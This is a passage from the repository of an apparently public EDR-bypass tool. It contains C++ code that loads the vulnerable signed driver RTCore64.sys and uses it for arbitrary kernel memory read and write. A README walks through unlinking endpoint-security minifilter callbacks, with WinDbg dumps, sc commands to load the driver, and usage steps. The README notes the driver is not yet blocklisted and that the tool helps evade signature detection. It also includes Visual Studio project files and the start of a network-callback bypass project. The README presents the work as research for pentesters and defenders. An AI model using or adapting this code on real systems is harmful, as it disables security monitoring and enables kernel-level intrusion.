			const char* strOperation = g_IrpMjMap.count((BYTE)op.MajorFunction) ? g_IrpMjMap[(BYTE)op.MajorFunction] : "IRP_MJ_UNDEFINED";
			printf("MajorFn: %s\nPre: %p\nPost %p\n", strOperation, op.PreOperation, op.PostOperation);
		}

		auto frameVolumes = oFlt.EnumFrameVolumes(lpFrame);
		const wchar_t* strHardDiskPrefix = LR"(\Device\HarddiskVolume)";
		BOOL bRes = false;
		if (strcmp(argv[1] + 1, "filterlinks") == 0) {
			bRes = oFlt.UnLinksForVolumesAndCallbacks(vecOperations, frameVolumes, indexToRemove);
			if (!bRes) {
				puts("Error patching links!");
				exit(-1);
			}
		}
		printf("Press Enter to Restore");
		Sleep(2000);
		getchar();
		BOOL res = oFlt.Restore();
	}

	return 0;
}
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MiniFilterFileCallbackernelBypass.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="MiniFilter Kernel Bypass.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="memory.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FltUtil.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MemHandler.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="FltUtil.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PebLdr.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FltDef.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="memory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MemHandler.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MiniFilterFileCallbackernelBypass.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MiniFilterFileCallbackernelBypass.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{973cd09d-b54a-4b52-8771-2ec18bb49241}</ProjectGuid>
    <RootNamespace>MiniFilterFileCallbackernelBypass</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="FltUtil.cpp" />
    <ClCompile Include="MemHandler.cpp" />
    <ClCompile Include="memory.cpp" />
    <ClCompile Include="MiniFilterFileCallbackernelBypass.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="FltDef.h" />
    <ClInclude Include="FltUtil.h" />
    <ClInclude Include="MemHandler.h" />
    <ClInclude Include="memory.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/MiniFilterFileCallbackernelBypass.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/memory.cpp`:

```cpp
#include "memory.h"

Memory::Memory()  {
	/* Constructor for Memory Manager */
	// Opens a handle to RTCORE64
    Memory::DriverHandle = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open handle to device\t0x%x\n", GetLastError());
        exit(1);
    }
    else {
        puts("Connected to device");

    }
}

result Memory::ReadMemoryPrimitive(DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    struct result resultdata;
    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
    // Set the status and value in the result structure
    resultdata.resultstatus = response;  // Set TRUE if successful, FALSE if failed
    resultdata.resultvalue = response ? MemoryRead.Value : 0;  // Set value or 0 if failed
    return resultdata;
}

BOOL Memory::WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return response;
}

BOOL Memory::WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) {
    BOOL response = false;
    BOOL response2 = false;
    response = WriteMemoryPrimitive(4, Address, Value & 0xffffffff);
    if (response) {
        response2 = WriteMemoryPrimitive(4, Address + 4, Value >> 32);
    }
    else {
        return response;
    }
    return response2;

}

BOOL Memory::VirtualRead(DWORD64 Address, void* Buffer, size_t Size) {
        DWORD bytesRead = 0;
        DWORD offset = 0;
        struct result resultdata;
        while (Size > 0) {
            // Read 4 bytes at a time or less if Size is less than 4 bytes
            DWORD chunkSize = (Size >= 0x04) ? 0x04 : Size;
            resultdata = ReadMemoryPrimitive(chunkSize, Address + offset);
            // Check if the read operation was successful
            if (!resultdata.resultstatus) {
                return false;  // Return false if the read operation fails
            }
            else {
                DWORD chunk = resultdata.resultvalue;
                // Copy the 4-byte chunk into the Buffer
                memcpy((BYTE*)Buffer + offset, &chunk, chunkSize);

                offset += chunkSize;
                Size -= chunkSize;
            }
        }
        return true;
}
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/memory.h`:

```h
#pragma once
#include <Windows.h>
#include <string>
#include "MemHandler.h"
#include <aclapi.h>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct result {
    DWORD resultvalue;
    BOOL resultstatus;
};

static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

class Memory : public MemHandler {
public:
	HANDLE DriverHandle;
	Memory();
    BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead);
    result ReadMemoryPrimitive(DWORD Size, DWORD64 Address);
    BOOL WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value);
    BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);
};
```

`MiniFilterFileCallbackKernelBypass/Readme.md`:

```md
# EDR bypass through minifilters callbacks delinking

MCP-PoC is a project that was developed 3 years ago for patching Callbacks related to File I/O operations by [MCP-PoC](https://github.com/alfarom256/MCP-PoC) that doesn't work anymore, so i decided to dig up and do some research to fix it.

## Warning

Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**

## Major Updates

Three major changes have been made to the original exploit:

- Updated the exploit to work with `RTCORE64.sys` instead of `dbutil_2_3.sys` because `dbutil_2_3.sys` is now blacklisted by MICROSOFT.

- Instead of patching the callbacks (which doesn't work anymore, as the calls are verified by KCFG), I used a different technique that attackers are using nowadays which is delinking (removing the link).

- Added Restore functionnality

## Load and run the vulnerable driver

Needs to run from an admin console, or you can use the build in commands in the tool.

<pre>
sc create VulnerableDriver binPath= C:\Users\Vixx\Desktop\RTCORE64.sys type= kernel
sc start VulnerableDriver
</pre>

**As the driver is not yet blocklisted by MICROSOFT, IT IS STILL POSSIBLE TO LOAD IT WITHOUT ANY ISSUE**

## Prerequisistes

This code is based on the original blog post: [Minifilter Callback Patching Proof-of-Concept](https://github.com/alfarom256/MCP-PoC)

This is an advanced topic requiring the following prerequisites:

- Assembly understanding

- Familiarity with C programming

- Experience with WinDbg

- Familiarity with IDA

- Windows kernel exploitation knowledge.

## Tools Used

WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Kernel Debugging Setup

To debug your local kernel (for fixing your offsets and reversing), follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Target Audience

This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.

## Purpose

Tools exist already for example [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) which is great that will do this and calculate offsets automaticaly, but this is designed to be small and on point for multiple reasons:

- For everyone to be able to learn how technically bypassing EDR (File Filters Callbacks) is done.
- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
- For researchers to be able to play around the code and debug and reverse and maybe find something new.

## Attacker Abuse Cases

An attacker with administrative privileges may attempt to disable EDR or install a rootkit. To interact with the kernel, a signed Microsoft driver is required. Since unsigned drivers cannot be loaded with Microsoft mitigations enabled (e.g., VBS, Hyper-V), attackers typically exploit vulnerable signed drivers that have not been blacklisted.

**FileCallbackKernelBypass project updated to use RTCORE64.sys driver which is not yet blocklisted by MICROSOFT**

## Introduction to File Filters Callbacks

EDR And AV solutions can as well set up callbacks for file I/O operations.

File system minifilters are drivers which are used to inspect, log, modify, or prevent file I/O operations. The filter manager driver (FltMgr.sys) effectively "sits in-between" the I/O Manager and the File System Driver, and is responsible for registration of file system minifilter drivers, and the invocation of their pre and post-operation callbacks. Such callbacks are provided by the minifilter, and are to be invoked before or after the I/O operation.

## How does it work

I am going over each function (in the c code) and explain what is does so you can make sense of the code yourself.

### Resolve FltEnumerateFilters And get FLTMGR!FltGlobals Address

First step in the C code is to get the `FLTMGR!FltGlobals` global variable address.

We can get this address through a binary search using the following exported function `FLTMGR!FltEnumerateFilters`

<pre>
FLTMGR!FltEnumerateFilters+0x81:
fffff800`350c90e1 e87a59316e      call    nt!ExInitializeFastOwnerEntry (fffff800`a33dea60)
fffff800`350c90e6 4c8b157310fdff  mov     r10,qword ptr [FLTMGR!_imp_KeEnterCriticalRegion (fffff800`3509a160)]
fffff800`350c90ed e8fe23326e      call    nt!KeEnterCriticalRegion (fffff800`a33eb4f0)
fffff800`350c90f2 41b001          mov     r8b,1
fffff800`350c90f5 488d942480000000 lea     rdx,[rsp+80h]
<mark>fffff800`350c90fd 488d0d9476fcff  lea     rcx,[FLTMGR!FltGlobals+0x58 (fffff800`35090798)]</mark>
fffff800`350c9104 4c8b154d10fdff  mov     r10,qword ptr [FLTMGR!_imp_ExAcquireFastResourceShared (fffff800`3509a158)]
fffff800`350c910b e820da146e      call    nt!ExAcquireFastResourceShared (fffff800`a3216b30)
</pre>

<pre>
const uint8_t patternFltGlobals[] = { 0x48, 0x8d, 0x0d, 0x58 };
</pre>

So the function `ResolveFltmgrGlobals` will resolve the address of `FLTMGR!FltGlobals` by loading `FLTMGR.sys` to the usermode process and using a binary search, by searching for `lea rcx` opcodes and calculate the offset of `FLTMGR!FltGlobals` and use that on the real driver base address of `FLTMGR.sys` to get the kernel address of `FLTMGR!FltGlobals` .

**Note:** we need to subtract 0x58 from the address we will get because as you can see from the snipped above, what we will get is `FLTMGR!FltGlobals+0x58`.

### GetFilterByName Function

Next step is to get the frame, in latest versions of windows only 1 Frame exist.

The frame will contains all the registered filters.

<pre>
lkd> x FLTMGR!FltGlobals
<mark>fffff800`35090740 FLTMGR!FltGlobals = <no type information></mark>
lkd> dt FLTMGR!_GLOBALS fffff800`35090740
   +0x000 DebugFlags       : 0
   +0x008 DebugTraceFlags  : 0
   +0x010 GFlags           : 0x143
   +0x018 RegHandle        : 0xffffa801`6c1fce10
   +0x020 NumProcessors    : 6
   +0x024 CacheLineSize    : 0x40
   +0x028 AlignedInstanceTrackingListSize : 0x40
   +0x030 ControlDeviceObject : 0xffffa801`6c077900 _DEVICE_OBJECT
   +0x038 DriverObject     : 0xffffa801`6c0776e0 _DRIVER_OBJECT
   +0x040 KtmTransactionManagerHandle : 0xffffffff`800001fc Void
   +0x048 TxVolKtmResourceManagerHandle : (null) 
   +0x050 TxVolKtmResourceManager : (null) 
   <mark>+0x058 FrameList        : _FLT_RESOURCE_LIST_HEAD
                                    [+0x068] rList [Type: _LIST_ENTRY]</mark>
lkd> dqs fffff800`35090740 + 0x058 + 0x068 L2
fffff800`35090800  ffffa801`6c078248
fffff800`35090808  ffffa801`6c078248
</pre>

As you can see `rList` contains the frames, and only one frame exists `ffffa8016c078248`

Next step is to get the filters from the frame.

First we need to subtract 0x08 from `ffffa8016c078248` to get to the the start of the frame structure `FLTMGR!_FLTP_FRAME`

<pre>
dt FLTMGR!_FLTP_FRAME 0xffffa8016c078240
    +0x008 Links : _LIST_ENTRY [ 0xfffff800`35090800 - 0xfffff800`35090800 ]
	+0x048 RegisteredFilters : _FLT_RESOURCE_LIST_HEAD
		<mark>[+0x068] rList            [Type: _LIST_ENTRY]</mark>
		[+0x078] rCount           : 0xc [Type: unsigned long]
</pre>

And so the c code will loop through each filter and compare the name of the filter with the one we want.

<pre>
lkd> dqs 0xffffa8016c078240 + 0x048 + 0x068 L2
ffffa801`6c0782f0  <mark>ffffa801`6e76a020</mark>
ffffa801`6c0782f8  ffffa801`6c089530
</pre>

We need to substract 0x10 from the address that we will use from the link list `ffffa8016e76a020` => to get to the base address of the filter structure `_FLT_FILTER`

<pre>
dt _FLT_FILTER <mark>ffffa801`6e76a010</mark>
	+0x038 Name             : _UNICODE_STRING "bindflt"
		[+0x000] Length           : 0xe [Type: unsigned short]
		[+0x002] MaximumLength    : 0xe [Type: unsigned short]
		[+0x008] Buffer           : 0xffffe606b29b3848 : "bindflt" [Type: wchar_t *]
</pre>

And you can see the name of this filter is `bindflt`

If one of the filter is the one we are interested in, the function returns the filter structure pointer `ffffa8016e76a010`

**Providing an non existant filter as input will show you all the filters ^^**

### GetFrameForFilter Function

This will return the frame structure pointer of the filter we chose.

<pre>
lkd> dt _FLT_FILTER ffffa801`6e76a010
    <mark>+0x030 Frame            : 0xffffa801`6c078240 _FLTP_FRAME</mark>
</pre>

The function will return `0xffffa8016c078240`

###  GetOperationsForFilter Function

Each Filter will contains a operations list which is associated to a pre and post operation.

so Each Filtter will be associated to a pre and post callback funtion that will be called on I/O file operation related to that filter.

The purpose of this function is to gather all the pre and post operations of that filter we chose.

<pre>
dt _FLT_FILTER ffffa801`6e76a010
	   <mark>+0x1a8 Operations       : 0xffffa801`6e76a2d0 _FLT_OPERATION_REGISTRATION</mark>
</pre>

Next let's dump the operations structure `_FLT_OPERATION_REGISTRATION`

<pre>
dt FLTMGR!_FLT_OPERATION_REGISTRATION 0xffffa801`6e76a2d0
   <mark>+0x000 MajorFunction    : 0 ''</mark>
   +0x004 Flags            : 0
   <mark>+0x008 PreOperation     : 0xfffff800`39fd7830     _FLT_PREOP_CALLBACK_STATUS  bindflt!BfPreCreate+0
   +0x010 PostOperation    : 0xfffff800`39fcf3b0     _FLT_POSTOP_CALLBACK_STATUS  bindflt!BfPostCreate+0</mark>
   +0x018 Reserved1        : (null) 
</pre>

The function will add Each operation to the list and go to the next one by adding the size of the operation structure (FLTMGR!_FLT_OPERATION_REGISTRATION)

so eventually the function will return a list containing all operations (pre and post) related to the filter we picked.

### EnumFrameVolumes Function

Each Frame is attached as well to volumes. you can consider a volume as a device name.

File Filters can be setup in a way to only be active and monitor I/O operations on a specific volume.

<pre>
dt FLTMGR!_FLTP_FRAME 0xffffa8016c078240
		<mark>+0x0c8 AttachedVolumes  : _FLT_RESOURCE_LIST_HEAD</mark>
			    [+0x000] rLock            : Unowned Resource [Type: _ERESOURCE]
				[+0x068] rList            [Type: _LIST_ENTRY]
				[+0x078] rCount           : 0x7 [Type: unsigned long]
</pre>

`rCount` => contains the numbers of volumes

Next the function will Loop through the `rList` list entries to get the volume structure pointers.

<pre>
lkd> dqs 0xffffa8016c078240 + 0x0c8 + 0x068 L2
ffffa801`6c078370  <mark>ffffa801`6c427050</mark>
ffffa801`6c078378  ffffa801`6df8d020
</pre>

Needs to subtract 10 from the address of the volume we get to reach the start of the volume structure `FLTMGR!_FLT_VOLUME`, for example `ffffa8016c427050 - 0x10`

<pre>
dt FLTMGR!_FLT_VOLUME ffffa801`6c427040
	+0x070 DeviceName       : _UNICODE_STRING "\Device\Mup"
		    [+0x000] Length           : 0x16 [Type: unsigned short]
			[+0x002] MaximumLength    : 0x16 [Type: unsigned short]
			[+0x008] Buffer           : 0xffffb58920da186c : "\Device\Mup" [Type: wchar_t *]
</pre>

The function will read the string length first and then the buffer which is the actual device name

The function will return a map => retVal[devicename] = (PVOID)lpVolume (pointer to the volume structure) for each volume.

### UnLinksForVolumesAndCallbacks Function

Each Volume will contains a list of callbacks, indexed by their Major Function + 22.

<pre>
dt FLTMGR!_FLT_VOLUME ffffa801`6c427040
	<mark>+0x140 Callbacks        : _CALLBACK_CTRL
	    [+0x000] OperationLists   [Type: _LIST_ENTRY [50]]</mark>
		[+0x320] OperationFlags   [Type: _CALLBACK_NODE_FLAGS [50]
</pre>

Each callback node (operation) contains a pre and post operation like in the filter.

Each one of the entries (there is 50) in the OperationLists are callbacks (pre/post operation) based on the major function index (of the filter callback) + 22

<pre>
lkd> dq ffffa801`6c427040 + 0x140 L1
ffffa801`6c427180  ffffc20e`bfc9a7d0
dt FLTMGR!_CALLBACK_NODE ffffc20e`bfc9a7d0
   +0x000 CallbackLinks    : _LIST_ENTRY
   +0x010 Instance         : Ptr64 _FLT_INSTANCE
   <mark>+0x018 PreOperation     : Ptr64     _FLT_PREOP_CALLBACK_STATUS 
   +0x020 PostOperation    : Ptr64     _FLT_POSTOP_CALLBACK_STATUS </mark>
   +0x018 GenerateFileName : Ptr64     long 
   +0x018 NormalizeNameComponent : Ptr64     long 
   +0x018 NormalizeNameComponentEx : Ptr64     long 
   +0x020 NormalizeContextCleanup : Ptr64     void 
   +0x028 Flags            : _CALLBACK_NODE_FLAGS
</pre>

As I said previously, Each one of the entries in the OperationLists are callbacks (pre/post operation) based on the major function index + 22

What it means is the major function of each operation we found in the filter in the function `GetOperationsForFilter` is associated to the callback at index (major function + 22) in the `OperationLists` in the volume structure.

So MAJORFUNCTION[0] (in the filter structure) = 22 (in the operationlists in the volume structure)

What the function will do is the following:
- Loop through the operations we got from the filters (from `GetOperationsForFilter`) First.
- Inside the first loop, Loop through the Volumes.
- Get the operation Entry (within the OperationLists of the volume structure) Based on the `Major Function (from the operation in step 1) + 22`.
The operation entry will contains all the callbacks that are setup for this volume
- Loop throught the CallbackLinks of the operationLists Entry we are in.
- Check if any of the pre / post callback entries (inside the operation) match the one from the filter operation (step 1).
- If so we remove the whole link from the linked list inside the operation (volume structure).

### Reference
https://github.com/alfarom256/MCP-PoC

## usage
Load and run the vulnerable Driver as administrator

<pre>
sc create VulnerableDriver binPath= C:\Users\Vixx\Desktop\RTCORE64.sys type= kernel
sc start VulnerableDriver
</pre>

Run the exe as administrator

<pre>
PS C:\Users\Vixx\Desktop\Tools\MiniFilterFileCallbackKernelBypass\x64\Release> .\MiniFilterFileCallbackernelBypass.exe
Usage: C:\Users\Vixx\Desktop\Tools\MiniFilterFileCallbackKernelBypass\x64\Release\MiniFilterFileCallbackernelBypass.exe
 /filtersshow <filtername> - List Filters or Major Function for a filter
 /filterlinks <filtername> - Remove Filters related to that driver
 /installDriver - Install the MSI driver
 /uninstallDriver - Uninstall the MSI driver
</pre>

Not Providing a filter, will output all filters to pick from.

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.

```

`NetworkKernelBypass/NetworkCallbackKernelBypass.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.11.35222.181
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "NetworkCallbackKernelBypass", "NetworkCallbackKernelBypass\NetworkCallbackKernelBypass.vcxproj", "{973CD09D-B54A-4B52-8771-2EC18BB49241}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.ActiveCfg = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.Build.0 = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.ActiveCfg = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.Build.0 = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.ActiveCfg = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.Build.0 = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.ActiveCfg = Release|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
